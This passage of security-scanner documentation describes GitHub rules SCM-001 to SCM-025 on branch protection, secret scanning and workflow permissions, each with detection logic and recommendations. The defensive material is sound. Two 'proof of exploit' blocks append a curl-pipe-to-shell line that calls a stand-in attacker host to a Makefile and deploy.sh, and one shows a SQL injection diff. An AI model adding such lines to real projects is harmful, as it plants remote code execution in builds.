- Numerous post-incident reports (PyPI / RubyGems package compromises 2018-2024) trace the initial maintainer-account takeover step to the absence of branch protection: the attacker pushed a single tampered commit to the default branch, the release pipeline ran on push, the malicious build shipped to the registry within minutes, and recovery required force-pushing the audit trail itself. Branch protection turns the entire class of attack into a review-then-merge gate.

**Proof of exploit.**

# With no protection rule on ``main``, a single compromised
# maintainer credential is enough to ship a tampered build:
#
#   git checkout main
#   echo 'curl https://attacker/c2 | sh' >> Makefile
#   git commit -am 'fix: tweak'
#   git push origin main           # no review required
#   # CI now runs the tampered build with full secret access.
#
# Recovery needs force-push to rewrite the trail:
#   git push --force origin main   # also unprotected
#
# A protection rule with `required_pull_request_reviews` set
# and `allow_force_pushes: false` blocks both the push and
# the rewrite without giving up an inch of velocity.

**Source:** [`SCM-001`](../providers/scm.md#scm-001) in the [SCM provider](../providers/scm.md).

#### `SCM-002`: Default branch protection does not require pull request reviews <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-002 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_pull_request_reviews.required_approving_review_count`` from the branch protection payload. Fires when the field is absent (no review requirement at all) or when the count is 0. ``SCM-001`` covers the case where no protection rule exists; this rule scopes specifically to the review-count knob inside an existing rule.

**Recommendation.** In the default-branch protection rule, enable ``Require a pull request before merging`` and set the minimum approving review count to at least 1 (Scorecard's threshold for Branch-Protection's middle tier; raise to 2 for higher trust). Combine with ``Dismiss stale pull request approvals when new commits are pushed`` so a force-push doesn't carry an old approval forward.

**Known false positives.**

- ``required_pull_request_reviews.bypass_pull_request_allowances`` is covered by ``SCM-018``: a protection rule that requires reviews but lists every contributor in the bypass allowlist still passes this rule even though the control is unenforced in practice. Read SCM-002 + SCM-018 as a pair when auditing whether required review actually fires.

**Proof of exploit.**

# With protection but no required reviews, a maintainer can
# self-approve a tampered change in two clicks:
#
#   git checkout -b release-fix
#   echo 'curl https://attacker/c2 | sh' >> deploy.sh
#   git commit -am 'fix: handle edge case'
#   git push origin release-fix
#   gh pr create --fill
#   gh pr merge --squash --auto    # no second-set-of-eyes
#   # Release pipeline runs the tampered build with full
#   # production secrets in scope.
#
# Setting ``required_approving_review_count`` to >= 1 forces
# a separate identity to acknowledge the change before merge.

**Source:** [`SCM-002`](../providers/scm.md#scm-002) in the [SCM provider](../providers/scm.md).

#### `SCM-003`: GitHub default code scanning is not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-003 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Reads ``state`` from the default code-scanning setup endpoint (``GET /repos/{owner}/{repo}/code-scanning/default-setup``). Fires when ``state`` is anything other than ``configured`` (``not-configured``, missing, or 404). This check only evaluates the default-setup endpoint. Repos running hand-authored CodeQL workflows or third-party SARIF uploads can still fail SCM-003; suppress per repo via ignore-file when that alternative coverage is intentional.

**Recommendation.** Enable default code scanning under the repository's Settings -> Code security -> Code scanning -> Default. The GitHub-managed CodeQL setup picks the right languages automatically and writes findings into the Code Scanning UI on every push and PR. Teams that already ship a CodeQL workflow can leave this rule's check off — but the default setup is the lowest-friction path for repos that don't have one.

**Known false positives.**

- Repos that ship a hand-authored CodeQL workflow (or use Semgrep / Snyk / another SAST whose results land in the Code Scanning UI via SARIF upload) get the same coverage without enabling default setup. Suppress via ignore-file rather than removing the rule.

**Proof of exploit.**

# Without code scanning, the only signal that a PR
# introduces (e.g.) a SQL injection or hardcoded secret
# comes from the human reviewer:
#
#   - def lookup(user_id):
#   -     return db.query("SELECT * FROM u WHERE id = ?", user_id)
#   + def lookup(user_id):
#   +     return db.query(f"SELECT * FROM u WHERE id = {user_id}")
#
# A reviewer skimming a 400-line PR misses this. Default
# CodeQL setup catches the same change as a CWE-89 finding
# in the PR check, surfaces it inline in the diff, and
# blocks the merge if the protection rule wires it up as
# a required status check (see SCM-008).

**Source:** [`SCM-003`](../providers/scm.md#scm-003) in the [SCM provider](../providers/scm.md).

#### `SCM-004`: GitHub secret scanning is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-004 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Reads ``security_and_analysis.secret_scanning.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Public repos get secret scanning free since 2023; private repos require a GitHub Advanced Security license. Without secret scanning, a credential committed even briefly is recoverable from git history indefinitely.

**Recommendation.** Enable secret scanning under the repository's Settings -> Code security -> Secret scanning. The GitHub-managed scanner covers ~200 token patterns from major providers and runs on every push. Pair with push protection so secrets are blocked at commit time rather than caught after the fact.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. The fix is to grant the token admin scope on the repo (or re-run with a personal token from a maintainer) rather than to suppress the rule.

**Seen in the wild.**

- GitGuardian's annual State of Secrets Sprawl reports find millions of fresh credential leaks per year across public GitHub commits, with the median time-to-revocation measured in days. Native secret scanning alerts the maintainer within minutes of the push, collapsing the exploitable window from days to minutes for the patterns it covers.

**Source:** [`SCM-004`](../providers/scm.md#scm-004) in the [SCM provider](../providers/scm.md).

#### `SCM-005`: Dependabot security updates are not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-005 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Reads ``security_and_analysis.dependabot_security_updates.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Without security updates, the team has to discover and triage CVEs against their dependency graph manually — a delay measured in days or weeks even on attentive teams, vs hours when the bot opens the PR for them.

**Recommendation.** Enable Dependabot security updates under the repository's Settings -> Code security -> Dependabot. The bot opens a PR with the minimum-required upgrade for each open advisory against an in-use dependency. Pair with version-update config (``.github/dependabot.yml``) so routine bumps don't rely on the security-update path.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that delegate dependency-update PRs to Renovate, Snyk, or another bot get equivalent coverage without Dependabot. Suppress via ignore-file rather than removing the rule.

**Source:** [`SCM-005`](../providers/scm.md#scm-005) in the [SCM provider](../providers/scm.md).

#### `SCM-006`: Default branch protection does not require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-006 }

**Evidences:** [`PR.AA-03`](#ctrl-pr-aa-03) Users, services, and hardware are authenticated, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_signatures.enabled`` from the branch protection payload. Fires when the field is missing or False. Required signatures don't validate signature authenticity (the GitHub web UI does that lazily on render), but a missing signature is rejected at push time, which blocks the most common compromise pattern: a stolen personal access token used to push under the maintainer's name without their signing key.

**Recommendation.** In the default-branch protection rule, enable ``Require signed commits``. Configure GPG, SSH, or S/MIME signatures for every contributor's git client (``git config commit.gpgsign true`` plus an uploaded public key). Pair with branch protection's ``Restrict who can push to matching branches`` so only signed commits from authorized identities land on the default branch.

**Source:** [`SCM-006`](../providers/scm.md#scm-006) in the [SCM provider](../providers/scm.md).

#### `SCM-007`: Default branch protection allows force-pushes <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-007 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``allow_force_pushes.enabled`` from the branch protection payload. Fires when the value is True. The complementary deletion-protection knob is covered by ``SCM-009``; this rule focuses on the rewrite-history attack class because force-push is the primitive every post-incident rewrite uses to clean up after itself.

**Recommendation.** In the default-branch protection rule, set ``Allow force pushes`` to ``Disabled``. Force-pushes overwrite the audit trail; an attacker who lands a malicious commit can erase evidence of it after the fact. Also set ``Allow deletions`` to ``Disabled`` so the branch itself can't be wiped.

**Source:** [`SCM-007`](../providers/scm.md#scm-007) in the [SCM provider](../providers/scm.md).

#### `SCM-008`: Default branch protection does not require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-008 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_status_checks.contexts`` (or the newer ``checks`` shape) from the branch protection payload. Fires when the field is missing or the contexts list is empty. Without required checks the merge gate degrades to human-only review; SCM-002 covers the review knob, this rule covers the automated-verification knob, and both should be on for high-trust default branches.

**Recommendation.** In the default-branch protection rule, enable ``Require status checks to pass before merging`` and list every check the team relies on (CI build, code scanning, secret scanning, lint). Set ``strict: true`` (``Require branches to be up to date before merging``) so a stale base doesn't land regressions the latest checks would catch.

**Known false positives.**

- The ``restrictions`` block (users / teams / apps allowed to push directly to the protected branch) is not consulted today: a rule that requires status checks but lists every contributor in the push-restrictions allowlist still passes this rule even though those identities can land code without the checks running. Audit the allowlist in the GitHub UI when this rule passes on a high-trust repo.
- Status-check names are matched as opaque strings; a configured required check that no workflow actually emits (typo, deleted job) will still pass this rule. The check would block the merge in practice (GitHub waits for the named context forever), but the misconfiguration itself isn't visible from the protection payload.

**Source:** [`SCM-008`](../providers/scm.md#scm-008) in the [SCM provider](../providers/scm.md).

#### `SCM-009`: Default branch protection allows branch deletion <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-009 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``allow_deletions.enabled`` from the branch protection payload. Fires when the value is True. Pairs with SCM-007 (force-push allowed) — the two flags together cover the complete rewrite-history attack class.

**Recommendation.** In the default-branch protection rule, set ``Allow deletions`` to ``Disabled``. A deleted default branch wipes every protection rule attached to it; an attacker with write access can delete the branch, recreate it from a tampered commit, and re-apply protection in a way that looks identical from the UI.

**Source:** [`SCM-009`](../providers/scm.md#scm-009) in the [SCM provider](../providers/scm.md).

#### `SCM-010`: Branch protection allows administrators to bypass <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-010 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``enforce_admins.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with every other SCM-NNN rule that reads a branch-protection knob — without enforce_admins, those rules document intent rather than reality.

**Recommendation.** In the default-branch protection rule, enable ``Do not allow bypassing the above settings`` (a.k.a. ``Include administrators``). Otherwise every other knob you set (required reviews, status checks, signed commits) becomes advisory rather than enforced. A compromised admin account is also a much shorter path to a tampered release than a compromised contributor account, so admins are exactly the identity the gate needs to apply to.

**Source:** [`SCM-010`](../providers/scm.md#scm-010) in the [SCM provider](../providers/scm.md).

#### `SCM-011`: Default branch protection does not require CODEOWNERS reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-011 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_pull_request_reviews.require_code_owner_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` covers the bare review-count knob; this rule scopes specifically to whose review counts. The check evaluates only the protection-rule toggle; verifying that an actual ``CODEOWNERS`` file exists at ``.github/CODEOWNERS`` (and covers the right paths) is left to the recommendation, since the GitHub API surfaces the file's presence as a separate contents request the SCM provider does not fetch.

**Recommendation.** In the default-branch protection rule, enable ``Require review from Code Owners``. Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (or ``docs/CODEOWNERS``) mapping directories to the team or individual responsible. The GitHub UI auto-requests review from the matched owners on every PR that touches a covered path; combined with this branch-protection knob, the merge is blocked until they approve.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path don't need the routing CODEOWNERS provides — but the protection knob still helps when a new team member joins. Suppress via ignore-file when the team intentionally stays flat.

**Source:** [`SCM-011`](../providers/scm.md#scm-011) in the [SCM provider](../providers/scm.md).

#### `SCM-012`: Default branch protection keeps stale reviews after a push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-012 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_pull_request_reviews.dismiss_stale_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` ensures a review is required at all; this rule ensures the approval the team relies on actually corresponds to the diff being merged.

**Recommendation.** In the default-branch protection rule, enable ``Dismiss stale pull request approvals when new commits are pushed``. Approvals will be cleared every time the PR head moves; the reviewer has to re-approve the latest diff before merge, closing the time-of-check / time-of-use gap an attacker can exploit by amending the branch after approval.

**Source:** [`SCM-012`](../providers/scm.md#scm-012) in the [SCM provider](../providers/scm.md).

#### `SCM-013`: Default branch protection does not require conversation resolution <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-013 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_conversation_resolution.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Severity is LOW because the rule documents process discipline rather than a structural vulnerability — but unresolved security comments are a common upstream cause of incidents.

**Recommendation.** In the default-branch protection rule, enable ``Require conversation resolution before merging``. PRs cannot land until every review comment is marked resolved. The friction is small (the PR author clicks ``Resolve`` after addressing) and the payoff is concrete: review comments can't be ignored to ship faster.

**Source:** [`SCM-013`](../providers/scm.md#scm-013) in the [SCM provider](../providers/scm.md).

#### `SCM-014`: Default branch protection does not require approval of the most recent push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-014 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_pull_request_reviews.require_last_push_approval`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with SCM-012 (dismiss stale reviews) — both close the same approval-time-of-check / merge-time-of-use gap from different angles.

**Recommendation.** In the default-branch protection rule, enable ``Require approval of the most recent reviewable push``. The reviewer and the most recent pusher must be different identities; an attacker controlling one collaborator account can no longer ship a malicious diff under another collaborator's approval.

**Source:** [`SCM-014`](../providers/scm.md#scm-014) in the [SCM provider](../providers/scm.md).

#### `SCM-015`: Secret scanning push protection is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-015 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Reads ``security_and_analysis.secret_scanning_push_protection.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Strongly paired with SCM-004 (secret scanning enabled): SCM-004 catches credentials after the push, SCM-015 stops them at the push. Both should be on for high-trust repos.

**Recommendation.** Enable secret scanning push protection under the repository's Settings -> Code security -> Push protection. Pushes containing matched credential patterns are refused by GitHub before the commit is accepted, so the credential never enters git history. Authors get an immediate remediation prompt; the bypass-with-justification flow preserves the audit trail when a legitimate test-case credential needs to land.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Push protection covers the GitHub-managed pattern set (~200 token patterns from major providers). Custom-pattern support requires GitHub Advanced Security on private repos; public repos get the GitHub-managed set free.

**Source:** [`SCM-015`](../providers/scm.md#scm-015) in the [SCM provider](../providers/scm.md).

#### `SCM-016`: Private vulnerability reporting is not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-016 }

**Evidences:** [`RS.MA-01`](#ctrl-rs-ma-01) The incident response plan is executed once an incident is declared.

**How this is detected.** Reads ``security_and_analysis.private_vulnerability_reporting.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Severity is LOW because the rule documents process readiness rather than a structural vulnerability — but having no private reporting channel means the next external researcher's report is either a public issue or nothing.

**Recommendation.** Enable private vulnerability reporting under the repository's Settings -> Code security -> Private vulnerability reporting. Researchers get a private ``Security`` tab where they can submit details directly to maintainers; the maintainers can then triage, request a CVE, coordinate disclosure timing, and merge a fix without exposing the bug publicly until ready.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that publish a SECURITY.md with an alternative out-of-band reporting channel (security@ mailbox, HackerOne / Bugcrowd program) cover the same control via a different mechanism. Suppress via ignore-file when the alternative is in place and documented.

**Source:** [`SCM-016`](../providers/scm.md#scm-016) in the [SCM provider](../providers/scm.md).

#### `SCM-017`: Repository has no CODEOWNERS file <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-017 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Probes the three canonical CODEOWNERS locations via ``GET /repos/{owner}/{repo}/contents/<path>``. Fires when none of the three returns a file response. Pairs with SCM-011 (the protection-rule toggle): SCM-011 covers intent, SCM-017 covers reality. A repo with both set is auditing the path-scoped review actually happens.

**Recommendation.** Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (the GitHub-recommended location), ``CODEOWNERS`` at the repo root, or ``docs/CODEOWNERS``. Map directories to the team or individual responsible for them. With SCM-011's ``require_code_owner_reviews`` knob enabled, GitHub auto-requests review from the matched owners on every PR; without the file, the toggle is meaningless and any reviewer can approve any change.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path may legitimately skip CODEOWNERS — the file adds no routing in that case. Suppress via ignore-file when the team intentionally stays flat. The same suppression applies to SCM-011.

**Source:** [`SCM-017`](../providers/scm.md#scm-017) in the [SCM provider](../providers/scm.md).

#### `SCM-018`: Required PR reviews can be bypassed by named identities <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-018 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``required_pull_request_reviews.bypass_pull_request_allowances`` from the branch protection payload. Fires when any of ``users`` / ``teams`` / ``apps`` is non-empty. Surfaces the counts so the operator can locate the bypass entries in the GitHub UI without re-running the audit manually.

**Recommendation.** In the default-branch protection rule, clear ``Allow specified actors to bypass required pull requests`` (``required_pull_request_reviews.bypass_pull_request_allowances`` in the API). Required reviews are only as strong as the bypass list. If a release-bot account needs to merge automated PRs, prefer a separate protection rule for the bot's branch namespace rather than a bypass entry on the default branch.

**Seen in the wild.**

- Multiple GitHub Security Lab writeups attribute post-incident review-control gaps to legacy bypass entries: a contractor onboarded years earlier is listed in the allowance, a compromise of that contractor account merges tampered code despite the team having added required reviews on the default branch.

**Source:** [`SCM-018`](../providers/scm.md#scm-018) in the [SCM provider](../providers/scm.md).

#### `SCM-019`: Push restrictions allowlist names individual users <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-019 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Reads ``restrictions.users`` from the branch protection payload. Fires when the list is non-empty. ``restrictions`` itself being absent is the default GitHub posture (no push allowlist; review gates govern access) and passes this rule. Teams and apps in ``restrictions`` are not flagged — the rule audits the personal-account subset specifically.

**Recommendation.** In the default-branch protection rule, audit the ``Restrict who can push to matching branches`` allowlist (``restrictions`` in the API). Move each individual user into a GitHub team and add the team instead, or replace with a GitHub App / bot service account when the entry is an automation. Named user entries are personal-compromise vectors that bypass every PR-review gate on the branch.

**Known false positives.**

- A break-glass admin account intentionally listed for incident response is a legitimate use case. Suppress via ignore-file once the account's access has been reviewed (MFA, hardware token, audit-logged use).

**Source:** [`SCM-019`](../providers/scm.md#scm-019) in the [SCM provider](../providers/scm.md).

#### `SCM-020`: Default workflow GITHUB_TOKEN has write permission <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-020 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Reads ``default_workflow_permissions`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. Values are ``"read"`` (safe) or ``"write"`` (fail). Requires the token to have ``admin`` scope on the repo; without it GitHub returns 403 and the rule passes silently with an unavailability note. Complements GHA-048 / GHA-049 — those catch the *workflow* asking for write; SCM-020 catches the *org / repo* handing out write by default.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, set the default to ``Read repository contents and packages permissions``. Workflows that genuinely need to push, comment on PRs, or modify issues opt in explicitly via the workflow-file ``permissions:`` block. The default ``write`` setting gives every workflow's ``GITHUB_TOKEN`` write access to every API surface the repo exposes (contents, issues, PRs, actions, packages, deployments), so a single compromised dependency in any job is one step away from the GHA-048 / GHA-049 worm-propagation primitives (workflow self-mutation, cross-repo push) the rule pack catches at the workflow-YAML layer. Setting the default to ``read`` is the org-side complement: even if a workflow forgets to declare ``permissions:`` and the compromised dep tries to push, GitHub refuses the operation.

**Known false positives.**

- Repos where every workflow legitimately needs write access (release-publishing automation, mirror-sync jobs) may set the default to ``write`` deliberately. The right pattern is still to keep the default at ``read`` and grant write at the workflow level — that way a new workflow (added by a future contributor) starts safe. Suppress only when every workflow in the repo carries an explicit ``permissions:`` block.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the worm's propagation primitive was a stolen ``GITHUB_TOKEN`` with ``contents: write`` and ``workflows: write``. Repos whose default workflow permissions were ``read`` were unaffected even when their workflows ran a compromised npm dep; ``write``-default repos handed the worm the keys.

**Source:** [`SCM-020`](../providers/scm.md#scm-020) in the [SCM provider](../providers/scm.md).

#### `SCM-021`: Actions can approve pull requests (self-approval bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-021 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``can_approve_pull_request_reviews`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. ``True`` is the fail signal; ``False`` (or absent) passes. Requires admin scope on the repo. Complements SCM-002 / SCM-011 / SCM-014 — without SCM-021, those rules document intent rather than enforcement, because Actions can fulfil the review requirement itself.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, uncheck ``Allow GitHub Actions to create and approve pull requests``. With it on, any workflow whose ``GITHUB_TOKEN`` includes ``pull-requests: write`` can submit an approving review on a PR — including its own. Required-review controls (SCM-002), CODEOWNERS reviews (SCM-011), and last-push approval (SCM-014) all become advisory once Actions can satisfy their own gate. A compromised dependency that opens a PR can immediately approve and merge it without any human in the loop.

**Known false positives.**

- Some orgs allow Actions self-approval as part of a tightly-scoped automation flow (e.g., a code-formatter bot that opens-and-merges its own PRs). The safer pattern is to grant the bot a dedicated PAT scoped to PR-create-and-approve, not the repo-wide GITHUB_TOKEN. Suppress only when the trade-off has been documented.

**Source:** [`SCM-021`](../providers/scm.md#scm-021) in the [SCM provider](../providers/scm.md).

#### `SCM-022`: Repo Actions permissions allow any source (no allow-list) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-022 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Reads ``allowed_actions`` from ``GET /repos/{owner}/{repo}/actions/permissions``. Values: ``"selected"`` (allow-listed) and ``"local_only"`` (org-internal only) pass; ``"all"`` (no restriction) fails. Requires admin scope. The rule passes silently when Actions is disabled at the repo level (``enabled: false``) — nothing runs, so the source restriction is moot.

**Recommendation.** In repo Settings → Actions → General → Actions permissions, set the allow-list mode to ``Allow <owner>, and select non-<owner>, actions and reusable workflows`` (``selected``) and curate a list of trusted publishers. Each new third-party action becomes an explicit decision rather than the result of a workflow writer adding ``uses: random/unknown@v1`` and CI silently executing it. The shipped pack of GHA-040 (compromised-action registry) plus GHA-041..047 (action reputation checks) provides the workflow-time signal; SCM-022 is the org-policy gate that says ``don't even let an untrusted action onto the runner.``

**Known false positives.**

- Repos that legitimately consume a wide variety of third-party actions (open-source CI examples, marketplace-aggregator demos) may accept the ``all`` mode as a trade-off. The right defense in that case is rigorous SHA-pinning (GHA-001) plus the GHA-040..047 reputation pack; SCM-022 is the org-level allow-list that becomes redundant when every workflow already pins to a vetted commit.

**Source:** [`SCM-022`](../providers/scm.md#scm-022) in the [SCM provider](../providers/scm.md).

#### `SCM-023`: Deployment environment lacks required-reviewer protection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-023 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/environments`` and flags every environment whose ``protection_rules`` list doesn't include a rule with ``type == "required_reviewers"``. Passes silently when no environments are configured (``total_count: 0``) — there's nothing to evaluate. Pairs with GHA-050 (the workflow-layer rule that checks ``jobs.<id>.environment:`` is declared) and SCM-024 (deployment-branch-policy on the same environments).

**Recommendation.** Configure required reviewers on every deployment environment (Settings → Environments → <name> → ``Required reviewers``). Pick a team or set of users who must approve each deployment job that targets the environment. Without a required-reviewer protection rule, any workflow run with the right environment name in its ``jobs.<id>.environment:`` block can deploy without human gate — the exact primitive GHA-050 (publish without OIDC + environment) catches at the workflow layer. SCM-023 is the org-level complement: a workflow that *declares* an environment still needs the environment itself to enforce the gate.

**Known false positives.**

- Non-production environments (``preview``, ``staging-ephemeral``) that legitimately auto-deploy without human gate are flagged by this rule, since GitHub doesn't distinguish environment severity. Suppress on those specific environment names with a rationale rather than disabling the rule for the whole repo.

**Source:** [`SCM-023`](../providers/scm.md#scm-023) in the [SCM provider](../providers/scm.md).

#### `SCM-024`: Deployment environment can deploy from any branch <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-024 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Reads each environment's ``deployment_branch_policy`` field. ``null`` means any branch can deploy and fails; ``{"protected_branches": true}`` or ``{"custom_branch_policies": true}`` (with at least one configured policy) passes. Passes silently when no environments are configured. Pairs with SCM-023 (required reviewers on the same environments); both knobs together close the deploy-gate loop.

**Recommendation.** Configure a deployment-branch policy on every environment (Settings → Environments → <name> → ``Deployment branches and tags``). Pick ``Protected branches only`` for production-like environments so a workflow run on a feature branch cannot push to production. The combination ``required reviewers`` (SCM-023) + ``deployment branch policy`` (SCM-024) is the deploy-gate the rest of the rule pack (GHA-050 publish-without-OIDC, SCM-001 branch protection) assumes is in place; without SCM-024, a workflow on any branch can target the production environment and reviewers approve a stale or wrong-branch deployment without realizing.

**Known false positives.**

- Test / preview environments often accept any branch by design (the whole point is to validate feature branches before merging). Suppress on those specific environment names; treat the rule as production-scoped.

**Source:** [`SCM-024`](../providers/scm.md#scm-024) in the [SCM provider](../providers/scm.md).

#### `SCM-025`: Repo has write-enabled deploy keys (push backdoor) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-025 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/keys`` and flags every deploy key whose ``read_only`` field is false. Requires ``admin`` scope on the repo; without it GitHub returns 403 / 404 and the rule passes silently with an unavailability note. Deploy keys come in two shapes: read-only (clone access only, safe equivalent of a public-fork checkout) and write-enabled (push access, the failure case this rule catches). The endpoint returns the SSH public key plus metadata, never the private half — the scan can't recover the credential, only enumerate which keys exist and what scope each carries.

Complements every branch-protection rule in the pack: without SCM-025, an unaudited write deploy key bypasses the entire control set the other rules document. Also pairs with SCM-018 (PR-review bypass allowance) and SCM-019 (push-restriction allowlist), which catch the same risk shape on the user / team side.

**Recommendation.** Convert every deploy key to read-only (Settings → Deploy keys → uncheck ``Allow write access``), then rotate the underlying SSH key pair if the previous holder no longer needs write access. Deploy keys are repo-scoped SSH credentials that bypass GitHub's normal RBAC — anyone with the private half can push directly, side-stepping branch protection (SCM-001), required reviews (SCM-002), CODEOWNERS (SCM-011), and the user-account audit trail. If the use case genuinely needs push (a CI runner that tags releases, a release-bot account), prefer a fine-grained PAT or a GitHub App with constrained scope, both of which carry user-visible audit-log entries that deploy keys do not.

**Known false positives.**

- Some CI flows legitimately use a write deploy key for release tagging or auto-generated docs commits. The right pattern is a GitHub App or a fine-grained PAT with an audit trail; deploy keys persist indefinitely and leave no record of who used them. Suppress with a one-line rationale that names the specific key title.

**Seen in the wild.**

